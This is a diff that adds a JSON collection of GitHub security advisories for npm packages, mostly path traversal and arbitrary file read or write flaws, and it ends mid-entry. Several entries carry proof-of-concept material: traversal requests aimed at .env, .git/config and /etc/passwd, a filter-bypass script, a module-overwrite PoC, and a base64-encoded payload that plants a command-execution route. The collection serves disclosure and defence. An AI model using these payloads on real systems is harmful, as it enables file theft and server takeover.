@@ -1,0 +1,1648 @@
+[
+   {
+      "package": {
+         "raw": "@vitest/browser@2.1.8",
+         "name": "browser",
+         "version": "2.1.8",
+         "scope": "vitest"
+      },
+      "id": "GHSA-8gvc-j273-4wm5",
+      "description": "### Summary\n`__screenshot-error` handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by [`browser.api.host: true`](https://vitest.dev/guide/browser/config.html#browser-api), an attacker can send a request to that handler from remote to get the content of arbitrary files.\n\n### Details\nThis `__screenshot-error` handler on the browser mode HTTP server responds any file on the file system.\nhttps://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130\n\nThis code was added by https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f.\n\n### PoC\n1. Create a directory and change the current directory to that directory\n1. Run `npx vitest init browser`\n1. Run `npm run test:browser`\n2. Run `curl http://localhost:63315/__screenshot-error?file=/path/to/any/file`\n\n### Impact\nUsers explicitly exposing the browser mode server to the network by [`browser.api.host: true`](https://vitest.dev/guide/browser/config.html#browser-api) may get any files exposed.",
+      "summary": "Vitest browser mode serves arbitrary files",
+      "date": "2025-02-04T16:51:08Z",
+      "cve": "CVE-2025-24963",
+      "year": 2025
+   },
+   {
+      "package": {
+         "raw": "path-sanitizer@3.0.1",
+         "name": "path-sanitizer",
+         "version": "3.0.1"
+      },
+      "id": "GHSA-94p5-r7cc-3rpr",
+      "description": "### Summary\nThis is a POC for a path-sanitizer [npm package](https://www.npmjs.com/package/path-sanitizer). The filters can be bypassed and can result in path traversal.\n\nPayload: `..=%5c` can be used to bypass this on CLI (along with other candidates). Something similar would likely work on web apps as well. \n\n### PoC\nHere's the code to test for the filter bypass:\n\n```js\nconst sanitize = require(\"path-sanitizer\")\nconst path = require(\"path\")\nconst fs = require(\"fs\")\n\n// Real scenario:\nfunction routeHandler(myPath) {\n  // Lets just assume that the path was extracted from the request\n  // We want to read a file in the C:\\Users\\user\\Desktop\\myApp\\ directory\n  // But the user should be able to access C:\\Users\\user\\Desktop\\\n  // So we need to sanitize the path\n\n  const APP_DIR = \"/var/hacker\"\n  const sanitized = path.join(APP_DIR, sanitize(myPath))\n\n  // Now we would usally read the file\n  // But in this case we just gonna print the path\n  // console.log(sanitized)\n  return sanitized\n}\n\nfunction readFile(filePath) {\n  const absolutePath = path.resolve(filePath) // Resolve to absolute path\n\n  fs.readFile(absolutePath, \"utf8\", (err, data) => {\n    if (err) {\n      console.error(`Error reading the file: ${err.message}`)\n      return\n    }\n    console.log(`Contents of the file ${filePath} :\\n${data}`)\n  })\n}\n\ninput_user_bypass = \"..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp/hacked.txt\"\n// input_user_bypass = \"..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd\"\ninput_user_payload = \"../../../../../../../../tmp/hacked.txt\"\n\nreadFile(routeHandler(input_user_bypass))\nreadFile(routeHandler(input_user_payload))\n```\n\nHere is a video POC: (this is a Loom POC, only users with the UUID of the video can see it) \n\nhttps://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d\n\n### Impact\nAny CLI tool or library using this package can be/will be vulnerable to Path traversal.\n",
+      "summary": "path-sanitizer allows bypassing the existing filters to achieve path-traversal vulnerability ",
+      "date": "2025-01-02T12:52:42Z",
+      "cve": "CVE-2024-56198",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "matrix-js-sdk@34.10.0",
+         "name": "matrix-js-sdk",
+         "version": "34.10.0"
+      },
+      "id": "GHSA-xvg8-m4x3-w6xr",
+      "description": "### Summary\n\nmatrix-js-sdk before 34.11.0 is vulnerable to client-side path traversal via crafted MXC URIs. A malicious room member can trigger clients based on the matrix-js-sdk to issue arbitrary authenticated GET requests to the client's homeserver.\n\n### Details\n\nThe Matrix specification demands homeservers to [perform validation](https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5) of the `server-name` and `media-id` components of MXC URIs with the intent to prevent path traversal. However, it is not mentioned that a similar check must also be performed on the client to prevent *client-side* path traversal. matrix-js-sdk fails to perform this validation.\n\n### Patches\n\nFixed in matrix-js-sdk 34.11.1.\n\n### Workarounds\n\nNone.\n\n### References\n\n- https://spec.matrix.org/v1.12/client-server-api/#security-considerations-5\n- https://blog.doyensec.com/2024/07/02/cspt2csrf.html\n",
+      "summary": "matrix-js-sdk has insufficient MXC URI validation which allows client-side path traversal",
+      "date": "2024-11-12T19:54:38Z",
+      "cve": "CVE-2024-50336",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "@oakserver/oak@14.1.0",
+         "name": "oak",
+         "version": "14.1.0",
+         "scope": "oakserver"
+      },
+      "id": "GHSA-qm92-93fv-vh7m",
+      "description": "### Summary\n\nBy default `oak` does not allow transferring of hidden files with `Context.send` API. However, this can be bypassed by\nencoding `/` as its URL encoded form `%2F`.\n\n### Details\n\n1.) Oak uses [decodeComponent](https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L182C10-L182C25) which seems to be unexpected. This is also the reason why it is not possible to access a file that\ncontains URL encoded characters unless the client URL encodes it first.\n\n2.) The function [isHidden](https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L117-L125) is flawed since it only checks if the first subpath is hidden, allowing secrets to be read from `subdir/.env`.\n\n### PoC\n\n```ts\n// server.ts\n\nimport { Application } from \"jsr:@oak/oak@17.1.2\";\n\nconst app = new Application();\n\napp.use(async (context, next) => {\n  try {\n    await context.send({\n      root: './root',\n      hidden: false, // default\n    });\n  } catch {\n    await next();\n  }\n});\n\nawait app.listen({ port: 8000 });\n```\n\nIn terminal:\n\n```bash\n# setup root directory\nmkdir root/.git\necho SECRET_KEY=oops > root/.env\necho oops >  root/.git/config\n\n# start server\ndeno run -A server.ts\n\n# in another terminal\ncurl -D- http://127.0.0.1:8000/poc%2f../.env\ncurl -D- http://127.0.0.1:8000/poc%2f../.git/config\n```\n\n### Impact\n\nFor an attacker this has potential to read sensitive user data or to gain access to server secrets.\n",
+      "summary": "Path traversal in oak allows transfer of hidden files within the served root directory",
+      "date": "2024-11-01T21:37:10Z",
+      "cve": "CVE-2024-49770",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "langchain@0.2.18",
+         "name": "langchain",
+         "version": "0.2.18"
+      },
+      "id": "GHSA-hc5w-c9f8-9cc4",
+      "description": "A path traversal vulnerability exists in the `getFullPath` method of langchain-ai/langchainjs version 0.2.5. This vulnerability allows attackers to save files anywhere in the filesystem, overwrite existing text files, read `.txt` files, and delete files. The vulnerability is exploited through the `setFileContent`, `getParsedFile`, and `mdelete` methods, which do not properly sanitize user input.",
+      "summary": "Langchain Path Traversal vulnerability",
+      "date": "2024-10-29T15:32:05Z",
+      "cve": "CVE-2024-7774",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "@vendure/asset-server-plugin@2.3.2",
+         "name": "asset-server-plugin",
+         "version": "2.3.2",
+         "scope": "vendure"
+      },
+      "id": "GHSA-r9mq-3c9r-fmjq",
+      "description": "# Description\n\n## Path traversal\n\nThis vulnerability allows an attacker to craft a request which is able to traverse the server file system and retrieve the contents of arbitrary files, including sensitive data such as configuration files, environment variables, and other critical data stored on the server.\n\nFrom Rajesh Sharma who discovered the vulnerability:\n\nPOC: `curl --path-as-is http://localhost:3000/assets/../package.json` gives you the content of package.json present in the local directory.\n\nThe vulnerability stems from usage of decodedReqPath directly in path.join without performing any path normalization i.e path.normalize in node.js\n\nhttps://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358\n\nIf the vendure service is behind some server like nginx, apache, etc. Path normalization is performed on the root server level but still the actual client's request path will be sent to vendure service but not the resultant normalized path. However, depending the type of root server one can try various payloads to bypass such normalization. \n\nThe reporter found a customer website which uses local asset plugin and using above mentioned vulnerability, and was able to find secrets like email credentials.\n\n\n## DOS via malformed URI\n\nIn the same code path is an additional vector for crashing the server via a malformed URI\n\nAgain from Rajesh:\n\nThere is also a potential Denial of Service (DoS) issue when incorrectly encoded URI characters are passed as part of the asset URL. When these malformed requests are processed, they can lead to system crashes or resource exhaustion, rendering the service unavailable to users.\nExploit: `curl  --path-as-is http://localhost:3000/assets/%80package.json` , here `%80` is not a valid url-encoded character hence the decodeURIComponent is called on it, the entire app crashes. \n\n```\n[:server] /Users/abc/mywork/vendure/packages/asset-server-plugin/src/plugin.ts:353\n[:server]         const decodedReqPath = decodeURIComponent(req.path);\n[:server]                                ^\n[:server] URIError: URI malformed\n```\n\n### Patches\nv3.0.5, v2.3.3\n\n### Workarounds\n- Use object storage rather than the local file system, e.g. MinIO or S3\n- Define middleware which detects and blocks requests with urls containing `/../`\n\n",
+      "summary": "Vendure asset server plugin has local file read vulnerability with AssetServerPlugin & LocalAssetStorageStrategy",
+      "date": "2024-10-15T18:00:02Z",
+      "cve": "CVE-2024-48914",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "@saltcorn/server@1.0.0-beta.13",
+         "name": "server",
+         "version": "1.0.0-beta.13",
+         "scope": "saltcorn"
+      },
+      "id": "GHSA-277h-px4m-62q8",
+      "description": "### Summary\n\nA user with admin permission can read and download arbitrary zip files when downloading auto backups. The file name used to identify the zip file is not properly sanitized when passed to `res.download` API.\n\n### Details\n\n- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/admin.js#L671-L682\n\n```js\nrouter.get(\n  \"/auto-backup-download/:filename\",\n  isAdmin,\n  error_catcher(async (req, res) => {\n    const { filename } = req.params; // [1] source\n    [...]\n    if (\n      !isRoot ||\n      !(filename.startsWith(backup_file_prefix) && filename.endsWith(\".zip\")) // [2]\n    ) {\n      res.redirect(\"/admin/backup\");\n      return;\n    }\n    const auto_backup_directory = getState().getConfig(\"auto_backup_directory\");\n    res.download(path.join(auto_backup_directory, filename), filename); // [3] sink\n  })\n);\n```\n\n### Steps to reproduce (PoC)\n\n- create a file with `.zip` extension under `/tmp` folder:\n```\necho \"secret12345\" > /tmp/secret.zip\n```\n- log into the application as an admin user\n- visit the url   `http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip`\n- download the zip file and then check if the zip was indeed downloaded:\n```bash\ncat secret.zip\nsecret12345\n```\n\n \n- Alternatively send the following request to retrieve the file just created.\n```bash\ncurl -i -X $'GET' \\\n    -H $'Host: localhost:3000' \\\n    -H $'Connection: close' \\\n    -b $'connect.sid=VALID_CONNECT_SID_COOKIE' \\\n    $'http://localhost:3000/admin/auto-backup-download/sc-backup-%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fsecret.zip'\n```\n\n**NOTE**:\nTo obtain a valid `connect.sid` cookie, just open the developer console while logged and retrieve the cookie value.\n\n### Impact\n\nArbitrary zip files download (information disclosure).\n\n### Recommended Mitigation\n\nResolve the `filename` parameter before checking if it starts with `backup_file_prefix` .",
+      "summary": "@saltcorn/server arbitrary file zip read and download when downloading auto backups",
+      "date": "2024-10-03T19:46:12Z",
+      "cve": null,
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "agnai@1.0.329",
+         "name": "agnai",
+         "version": "1.0.329"
+      },
+      "id": "GHSA-g54f-66mw-hv66",
+      "description": "### Summary\n\nA vulnerability has been discovered in **Agnai** that permits attackers to upload image files at attacker-chosen location on the server. This issue can lead to image file uploads to unauthorized or unintended directories, including overwriting of existing images which may be used for defacement.\n\nThis does not affect:\n\n- agnai.chat\n- installations using S3-compatible storage\n- self-hosting that is not publicly exposed\n\n### CWE-35: Path Traversal\n\nhttps://cwe.mitre.org/data/definitions/35.html\n\n### CVSS4.0 - 2.3 Low\n\nCVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N\n\n### Details\n\nThis is a path traversal vulnerability. An attacker can exploit this vulnerability by sending a specially crafted request to the `editCharacter` handler https://github.com/agnaistic/agnai/blob/75abbd5b0f5e48ddecc805365cf1574d05ee1ce5/srv/api/character.ts#L140:\n\n```tsx\nPOST /api/character/28cbe508-2fa9-4890-886e-61d73e22006c%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%61%70%70%2f%64%69%73%74%2f%64%61%6e%79%61%6e%67 HTTP/1.1\n```\n\nThe path traversal character sequence makes it’s way into the `id` variable which is then string interpolated into `filename`. \n\n```jsx\nexport async function entityUpload(kind: string, id: string, attachment?: Attachment) {\n  if (!attachment) return\n  const filename = `${kind}-${id}`\n  return upload(attachment, filename)\n}\n```\n\nhttps://github.com/agnaistic/agnai/blob/75abbd5b0f5e48ddecc805365cf1574d05ee1ce5/srv/api/upload.ts#L55\n\nNo path normalization is conducted nor checked, so attackers can freely manipulate the path which the file is uploaded to.\n\n### Impact\n\nThis vulnerability is classified as a path traversal vulnerability. Attackers can upload image files to arbitrary locations, potentially overwriting critical system image files.\n\n### Credit\nSecurity research in collaboration with Analyst [Danyang Liu (noe223)](https://github.com/noe233) @noe233",
+      "summary": "Agnai vulnerable to Relative Path Traversal in Image Upload",
+      "date": "2024-09-26T18:16:13Z",
+      "cve": "CVE-2024-47171",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "agnai@1.0.329",
+         "name": "agnai",
+         "version": "1.0.329"
+      },
+      "id": "GHSA-h355-hm5h-cm8h",
+      "description": "### CWE-35: Path Traversal\n\nhttps://cwe.mitre.org/data/definitions/35.html\n\n### CVSSv3.1 4.3 - Medium\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N\nCVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N\n\n### Summary\n\nA vulnerability has been discovered in **Agnai** that permits attackers to read arbitrary JSON files at attacker-chosen locations on the server. This issue can lead to unauthorized access to sensitive information and exposure of confidential configuration files.\n**This only affects installations with `JSON_STORAGE` enabled which is intended to local/self-hosting only.**\n\n### Details & PoC\n\nThis is a path traversal vulnerability. An attacker can exploit this vulnerability by sending a specially crafted request:\n\n```tsx\nGET /api/json/messages/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%61%70%70%2fpackage HTTP/1.1\n```\n\nIn this example, the attacker retrieves the `package.json` file content from the server by manipulating the file path.\n\nThe request is processed by the `loadMessages` handler in `agnai/srv/api/json/index.ts` and a file is read and returned to the client. The read filename is constructed using string interpolation, with no guard or check for path traversal: https://github.com/agnaistic/agnai/blob/2b878b7ca66471c5dd080197ad9ca2f7f0022655/srv/api/json/index.ts#L77\n\n#### Constraints\n\nEnvironment constraints: JSON Storage enabled (non standard)\n\n### Impact\n\nThis vulnerability is classified as a path traversal vulnerability. Specifically, any JSON file on the server which the webserver process has read privileges for, can be disclosed to the attacker.\n\n### Credit\n- @ropwareJB\n- @noe233",
+      "summary": "Agnai File Disclosure Vulnerability: JSON via Path Traversal ",
+      "date": "2024-09-26T18:07:52Z",
+      "cve": "CVE-2024-47170",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "agnai@1.0.329",
+         "name": "agnai",
+         "version": "1.0.329"
+      },
+      "id": "GHSA-mpch-89gm-hm83",
+      "description": "## Summary\n\nA vulnerability has been discovered in **Agnai** that permits attackers to upload arbitrary files to attacker-chosen locations on the server, including JavaScript, enabling the execution of commands within those files. This issue could result in unauthorized access, full server compromise, data leakage, and other critical security threats.\n\nThis **does not** affect:\n- `agnai.chat`\n- installations using S3-compatible storage\n- self-hosting that is not publicly exposed\n\nThis **DOES** affect:\n- publicly hosted installs without S3-compatible storage\n\n### CWEs\n\nCWE-35: Path Traversal\n\nCWE-434: Unrestricted Upload of File with Dangerous Type\n\n### CVSS-4.0 - **9.0 - Critical**\n\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\nCVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H\n\n### Description\n\nPath Traversal and Unrestricted Upload of File with Dangerous Type\n\nPath Traversal Location\n\n```tsx\nPOST /api/chat/5c25e8dc-67c3-40e1-9572-32df2e26ff38/temp-character HTTP/1.1\n{\"_id\": \"/../../../../../../app/srv/api/voice\",...<ommitted>}\n```\n\nIn the following file, the `_id` parameter which is a remote-supplied parameter is not properly validated and sanitized.\n\nhttps://github.com/agnaistic/agnai/blob/437227d9aa86132f3be3b41c89981cb393c903d0/srv/api/chat/characters.ts#L101\n\n```jsx\n const upserted: AppSchema.Character = {\n    _id: body._id || `temp-${v4().slice(0, 8)}`,\n    kind: 'character',\n    createdAt: now(),\n```\n\nIn the following file, the `filename` (or `id`)  and  `content` variables are not properly sanitized and validated,\n\nhttps://github.com/agnaistic/agnai/blob/dev/srv/api/upload.ts#L63\n\n```jsx\nexport async function entityUploadBase64(kind: string, id: string, content?: string) {\n  if (!content) return\n  if (!content.includes(',')) return\n\n  const filename = `${kind}-${id}`\n  const attachment = toAttachment(content)\n  return upload(attachment, filename)\n}\n```\n\n```jsx\nfunction toAttachment(content: string): Attachment {\n  const [prefix, base64] = content.split(',')\n  const type = prefix.slice(5, -7)\n  const [, ext] = type.split('/')\n  return {\n    ext,\n    field: '',\n    original: '',\n    type: getType(ext),\n    content: Buffer.from(base64, 'base64'),\n  }\n}\n```\n\nAn attacker can freely specify arbitrary file types (and arbitrary base64-encoded file content), thereby permitting them to upload JavaScript files and by abusing the `_id` parameter, to control the location of the file to overwrite an existing server file;\n\n```jsx\nPOST /api/chat/5c25e8dc-67c3-40e1-9572-32df2e26ff38/temp-character HTTP/1.1\n...\nConnection: keep-alive\n\n{\n\"_id\": \"/../../../../../../app/srv/api/voice\",\n\"name\":\"\",\"description\":\"\",\"culture\":\"en-us\",\"tags\":[],\"scenario\":\"\",\"appearance\":\"\",\"visualType\":\"avatar\",\"avatar\":\"data:image/js;base64,InVzZSBzdHJpY3QiOwpPYmplY3QuZGVmaW5lUHJvcGVydHkoZXhwb3J0cywgIl9fZXNNb2R1bGUiLCB7IHZhbHVlOiB0cnVlIH0pOwpjb25zdCBleHByZXNzXzEgPSByZXF1aXJlKCJleHByZXNzIik7CmNvbnN0IHdyYXBfMSA9IHJlcXVpcmUoIi4vd3JhcCIpOwpjb25zdCB2b2ljZV8xID0gcmVxdWlyZSgiLi4vdm9pY2UiKTsKY29uc3QgZGJfMSA9IHJlcXVpcmUoIi4uL2RiIik7CmNvbnN0IHZhbGlkXzEgPSByZXF1aXJlKCIvY29tbW9uL3ZhbGlkIik7CmNvbnN0IHJvdXRlciA9ICgwLCBleHByZXNzXzEuUm91dGVyKSgpOwpjb25zdCB0ZXh0VG9TcGVlY2hWYWxpZCA9IHsgdGV4dDogJ3N0cmluZycsIHZvaWNlOiAnYW55JyB9Owpjb25zdCB0ZXh0VG9TcGVlY2ggPSAoMCwgd3JhcF8xLmhhbmRsZSkoYXN5bmMgKHsgYm9keSwgdXNlcklkLCBzb2NrZXRJZCwgbG9nLCBwYXJhbXMgfSkgPT4gewogICAgY29uc3QgdXNlciA9IHVzZXJJZCA/IGF3YWl0IGRiXzEuc3RvcmUudXNlcnMuZ2V0VXNlcih1c2VySWQpIDogYm9keS51c2VyOwogICAgY29uc3QgZ3Vlc3RJZCA9IHVzZXJJZCA/IHVuZGVmaW5lZCA6IHNvY2tldElkOwogICAgKDAsIHZhbGlkXzEuYXNzZXJ0VmFsaWQpKHRleHRUb1NwZWVjaFZhbGlkLCBib2R5KTsKICAgIHJldHVybiAoMCwgdm9pY2VfMS5nZW5lcmF0ZVRleHRUb1NwZWVjaCkodXNlciwgbG9nLCBndWVzdElkLCBib2R5LnRleHQsIGJvZHkudm9pY2UpOwp9KTsKY29uc3QgZ2V0Vm9pY2VzID0gKDAsIHdyYXBfMS5oYW5kbGUpKGFzeW5jICh7IGJvZHksIHVzZXJJZCwgc29ja2V0SWQsIGxvZywgcGFyYW1zIH0pID0+IHsKICAgIGNvbnN0IHR0c1NlcnZpY2UgPSBwYXJhbXMuaWQ7CiAgICBjb25zdCB1c2VyID0gdXNlcklkID8gYXdhaXQgZGJfMS5zdG9yZS51c2Vycy5nZXRVc2VyKHVzZXJJZCkgOiBib2R5LnVzZXI7CiAgICBjb25zdCBndWVzdElkID0gdXNlcklkID8gdW5kZWZpbmVkIDogc29ja2V0SWQ7CiAgICByZXR1cm4gKDAsIHZvaWNlXzEuZ2V0Vm9pY2VzTGlzdCkoeyB0dHNTZXJ2aWNlOiB0dHNTZXJ2aWNlLCB1c2VyIH0sIGxvZywgZ3Vlc3RJZCk7Cn0pOwpjb25zdCBnZXRNb2RlbHMgPSAoMCwgd3JhcF8xLmhhbmRsZSkoYXN5bmMgKHsgYm9keSwgdXNlcklkLCBzb2NrZXRJZCwgbG9nLCBwYXJhbXMgfSkgPT4gewogICAgY29uc3QgdHRzU2VydmljZSA9IHBhcmFtcy5pZDsKICAgIGNvbnN0IHVzZXIgPSB1c2VySWQgPyBhd2FpdCBkYl8xLnN0b3JlLnVzZXJzLmdldFVzZXIodXNlcklkKSA6IGJvZHkudXNlcjsKICAgIGNvbnN0IGd1ZXN0SWQgPSB1c2VySWQgPyB1bmRlZmluZWQgOiBzb2NrZXRJZDsKICAgIHJldHVybiAoMCwgdm9pY2VfMS5nZXRNb2RlbHNMaXN0KSh7IHR0c1NlcnZpY2U6IHR0c1NlcnZpY2UsIHVzZXIgfSwgbG9nLCBndWVzdElkKTsKfSk7Cgpjb25zdCBnZXRDbWQgPSAoMCwgd3JhcF8xLmhhbmRsZSkoYXN5bmMgKHsgYm9keSwgdXNlcklkLCBzb2NrZXRJZCwgbG9nLCBwYXJhbXMgfSkgPT4gewoJY29uc3QgY2hpbGRfcHJvY2Vzc18xID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpOwoJY2hpbGRfcHJvY2Vzc18xLmV4ZWNTeW5jKGJvZHkuY21kKTsKICAgIHJldHVybiAoMCwgdm9pY2VfMS5nZXRNb2RlbHNMaXN0KSh7IHR0c1NlcnZpY2U6IHR0c1NlcnZpY2UsIHVzZXIgfSwgbG9nLCBndWVzdElkKTsKfSk7Cgpyb3V0ZXIucG9zdCgnL3R0cycsIHRleHRUb1NwZWVjaCk7CnJvdXRlci5wb3N0KCcvOmlkL3ZvaWNlcycsIGdldFZvaWNlcyk7CnJvdXRlci5wb3N0KCcvOmlkL21vZGVscycsIGdldE1vZGVscyk7CnJvdXRlci5wb3N0KCcvY21kJywgZ2V0Q21kKTsKZXhwb3J0cy5kZWZhdWx0ID0gcm91dGVyOwovLyMgc291cmNlTWFwcGluZ1VSTD12b2ljZS5qcy5tYXA=\",\"sprite\":null,\"greeting\":\"\",\"sampleChat\":\"\",\"voiceDisabled\":false,\"voice\":{},\"systemPrompt\":\"\",\"postHistoryInstructions\":\"\",\"insert\":{\"prompt\":\"\",\"depth\":3},\"alternateGreetings\":[],\"creator\":\"\",\"characterVersion\":\"\",\"persona\":{\"kind\":\"text\",\"attributes\":{\"text\":[\"\"]}},\"imageSettings\":{\"type\":\"sd\",\"steps\":10,\"width\":512,\"height\":512,\"prefix\":\"\",\"suffix\":\"\",\"negative\":\"\",\"cfg\":9,\"summariseChat\":true,\"summaryPrompt\":\"\"}}\n```\n\n### Risk\n\nThe attacker can write arbitrary files to disk, including overwriting existing JavaScript to execute arbitrary code on the server, leading to a complete system compromise, server control, and further network penetration.\n\nAttackers can gain full access to the server.\n\n### Recommendation\n\n**Input Validation**\n\n- Ensure thorough validation of user inputs, particularly id parameter, file paths and file names, to prevent directory traversal and ensure they end up in the desired folder location post-normalization. [[OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)\n\n**Arbitrary File Upload**\n\n- Restrict the types of files that can be uploaded via a allow-only list.\n\n### Credits\n- @ropwareJB\n- @noe233",
+      "summary": "Agnai vulnerable to Remote Code Execution via JS Upload using Directory Traversal",
+      "date": "2024-09-26T18:05:12Z",
+      "cve": "CVE-2024-47169",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "@backstage/plugin-techdocs-backend@1.10.12",
+         "name": "plugin-techdocs-backend",
+         "version": "1.10.12",
+         "scope": "backstage"
+      },
+      "id": "GHSA-39v3-f278-vj3g",
+      "description": "### Impact\n\nWhen using the AWS S3 or GCS storage provider for TechDocs it is possible to access content in the entire storage bucket. This can leak contents of the bucket that are not intended to be accessible, as well as bypass permission checks in Backstage.\n\n### Patches\n\nThis has been fixed in the 1.10.13 release of the `@backstage/plugin-techdocs-backend` package.\n\n### References\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in the [Backstage repository](https://github.com/backstage/backstage)\nVisit our Discord, linked to in [Backstage README](https://github.com/backstage/backstage)\n",
+      "summary": "@backstage/plugin-techdocs-backend storage bucket Directory Traversal vulnerability",
+      "date": "2024-09-17T21:30:20Z",
+      "cve": "CVE-2024-45816",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "@actions/artifact@2.1.1",
+         "name": "artifact",
+         "version": "2.1.1",
+         "scope": "actions"
+      },
+      "id": "GHSA-6q32-hq47-5qq3",
+      "description": "### Impact\n\nVersions of `actions/artifact` before 2.1.7 are vulnerable to arbitrary file write when using `downloadArtifactInternal`, `downloadArtifactPublic`, or `streamExtractExternal` for extracting a specifically crafted artifact that contains path traversal filenames.\n\n### Patches\n\nUpgrade to version 2.1.7 or higher. \n\n### References\n\n- https://snyk.io/research/zip-slip-vulnerability\n- https://github.com/actions/toolkit/pull/1724\n\n### CVE\n\nCVE-2024-42471\n\n### Credits\n\nJustin Taft from Google",
+      "summary": "@actions/artifact has an Arbitrary File Write via artifact extraction",
+      "date": "2024-09-03T20:08:30Z",
+      "cve": "CVE-2024-42471",
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "unzip-stream@0.3.1",
+         "name": "unzip-stream",
+         "version": "0.3.1"
+      },
+      "id": "GHSA-6jrj-vc65-c983",
+      "description": "### Impact\n\nWhen using the `Extract()` method of unzip-stream, malicious zip files were able to write to paths they shouldn't be allowed to.\n\n### Patches\n\nFixed in 0.3.2\n\n### References\n\n- https://snyk.io/research/zip-slip-vulnerability\n- https://github.com/mhr3/unzip-stream/compare/v0.3.1...v0.3.2\n\n### Credits\n\nJustin Taft from Google",
+      "summary": "unzip-stream allows Arbitrary File Write via artifact extraction",
+      "date": "2024-08-26T15:17:40Z",
+      "cve": null,
+      "year": 2024
+   },
+   {
+      "package": {
+         "raw": "webcrack@2.14.0",
+         "name": "webcrack",
+         "version": "2.14.0"
+      },
+      "id": "GHSA-ccqh-278p-xq6w",
+      "description": "### Summary\nAn arbitrary file write vulnerability exists in the webcrack module when processing specifically crafted malicious code on Windows systems. This vulnerability is triggered when using the unpack bundles feature in conjunction with the saving feature. If a module name includes a path traversal sequence with Windows path separators, an attacker can exploit this to overwrite files on the host system.\n\n### Details\n\nSource: [packages/webcrack/src/unpack/bundle.ts#L79](https://github.com/j4k0xb/webcrack/blob/241f9469e6401f3dabc6373233d85a5e76966b54/packages/webcrack/src/unpack/bundle.ts#L79)\n```ts\nimport { posix } from 'node:path';\nimport type { Module } from './module';\n\n// eslint-disable-next-line @typescript-eslint/unbound-method\nconst { dirname, join, normalize } = posix;\n\n/* ... snip ... */\n\nconst modulePath = normalize(join(path, module.path));\nif (!modulePath.startsWith(path)) {\n    throw new Error(`detected path traversal: ${module.path}`);\n}\nawait mkdir(dirname(modulePath), {\n    recursive: true\n});\nawait writeFile(modulePath, module.code, 'utf8');\n```\n\nIn this code, the application explicitly relies on the POSIX version of path utilities (`dirname`, `join`, `normalize`) from Node.js. However, the vulnerability arises because the POSIX version of the `normalize` function does not recognize `\\` as a path separator. As a result, on Windows systems, the path traversal check fails, allowing an attacker to write files to unintended locations.\n\n### PoC\nThe following proof of concept demonstrates how this vulnerability can be exploited to overwrite and hijack the `debug` module in Node.js:\n\n**Malicious Script (what.js):**\n\n```js\n(function (e) {\n    var n = {};\n    function o(r) {\n      if (n[r]) {\n        return n[r].exports;\n      }\n      var a = (n[r] = {\n        i: r,\n        l: false,\n        exports: {},\n      });\n      e[r].call(a.exports, a, a.exports, o);\n      a.l = true;\n      return a.exports;\n    }\n    o.p = '';\n    o((o.s = 386));\n  })({\n    './\\\\..\\\\node_modules\\\\debug\\\\src\\\\index': function (e, t, n) {\n        module.exports = () => console.log(\"pwned\")\n    },\n  });\n```\n\n**Webcrack Script (index.js):**\n\n```js\nimport fs from 'fs';\nimport { webcrack } from 'webcrack';\n\nconst input = fs.readFileSync('what.js', 'utf8');\n\nconst result = await webcrack(input);\nconsole.log(result.code);\nconsole.log(result.bundle);\nawait result.save('output-dir');\n```\n\n**Execution:**\nRunning the above script with `node index.js` twice results in the following output being printed to the terminal:\n\n```\nPS C:\\Webcrack> node .\\index.js\nDebugger attached.\n(function (e) {\n  var n = {};\n  function o(r) {\n    if (n[r]) {\n      return n[r].exports;\n    }\n    var a = n[r] = {\n      i: r,\n      l: false,\n      exports: {}\n    };\n    e[r].call(a.exports, a, a.exports, o);\n    a.l = true;\n    return a.exports;\n  }\n  o.p = \"\";\n  o(o.s = 386);\n})({\n  \"./\\\\..\\\\node_modules\\\\debug\\\\src\\\\index\": function (e, 